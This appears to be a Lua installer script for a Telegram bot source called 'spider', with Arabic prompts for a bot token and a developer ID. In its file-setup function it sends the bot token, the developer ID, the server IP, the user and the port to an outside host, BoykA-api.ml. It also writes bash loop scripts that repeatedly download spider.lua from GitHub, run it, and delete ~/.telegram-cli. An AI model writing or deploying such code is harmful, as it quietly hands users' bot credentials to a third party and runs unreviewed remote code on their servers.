redis=dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
serpent=dofile("./File_Libs/serpent.lua")
JSON=dofile("./File_Libs/dkjson.lua")
json=dofile("./File_Libs/JSON.lua")
http= require("socket.http")
URL=dofile("./File_Libs/url.lua")
https= require("ssl.https")
local AutoFiles_spider = function() 
local Create_Info = function(Token,Sudo)  
local Write_Info_Sudo = io.open("sudo.lua", 'w')
Write_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

]])
Write_Info_Sudo:close()
end  
if not redis:get(Server_spider.."Token_spider") then
print('\n\27[1;41m ارسل توكن البوت الان : \n\27[0;39;49m')
local token = io.read()
if token ~= '' then
data,res = https.request("https://BoykA-api.ml/index.php?p="..GithubUser)
if res == 200 then
tr = json:decode(data)
if tr.Info.info == 'Is_Spam' then
io.write('\n\27[1;31m'..tr.Info.info..'\n\27[0;39;49m')
os.execute('lua start.lua')
end ---ifBn
if tr.Info.info == 'Ok' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;35m عذرا التوكن خطأ  : \n\27[0;39;49m')
else
io.write('\n\27[1;45m تم حفظ التوكن : \n\27[0;39;49m') 
redis:set(Server_spider.."Token_spider",token)
end ---ifok
end ---ifok
else
io.write('\n\27[1;31m لم يتم حفظ التوكن حاول وقت اخر : \n\27[0;39;49m')
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
if not redis:get(Server_spider.."UserSudo_spider") then
print('\n\27[1;41m ارسل ايدي مطور البوت الان : \n\27[0;39;49m')
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://BoykA-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
muaed = json:decode(data)
if muaed.Info.info == 'Is_Spam' then
io.write('\n\27[1;35m عذرا الايدي محظور من السورس \n\27[0;39;49m') 
os.execute('lua start.lua')
end ---ifBn
if muaed.Info.info == 'Ok' then
io.write('\n\27[1;39m تم حفظ الايدي بنجاح \n\27[0;39;49m') 
redis:set(Server_spider.."UserSudo_spider",Id)
end ---ifok
else
io.write('\n\27[1;31m تم حفظ الايدي يوجد خطأ : \n\27[0;39;49m')
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
local function Files_Info_Get()
Create_Info(redis:get(Server_spider.."Token_spider"),redis:get(Server_spider.."UserSudo_spider"))   
local t = json:decode(https.request('https://BoykA-api.ml/index.php?n=by&id='..redis:get(Server_spider.."UserSudo_spider").."&token="..redis:get(Server_spider.."Token_spider").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
local RunBot = io.open("Run", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/spider
token="]]..redis:get(Server_spider.."Token_spider")..[["
rm -fr spider.lua
wget "https://raw.githubusercontent.com/spider/spidersr/master/spider.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./spider.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("BA", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/spider
while(true) do
rm -fr ../.telegram-cli
screen -S spider -X kill
screen -S spider ./Run
done
]])
RunTs:close()
end
Files_Info_Get()
redis:del(Server_spider.."Token_spider");redis:del(Server_spider.."UserSudo_spider")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_spider()  
var = true
else   
f:close()  
redis:del(Server_spider.."Token_spider");redis:del(Server_spider.."UserSudo_spider")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()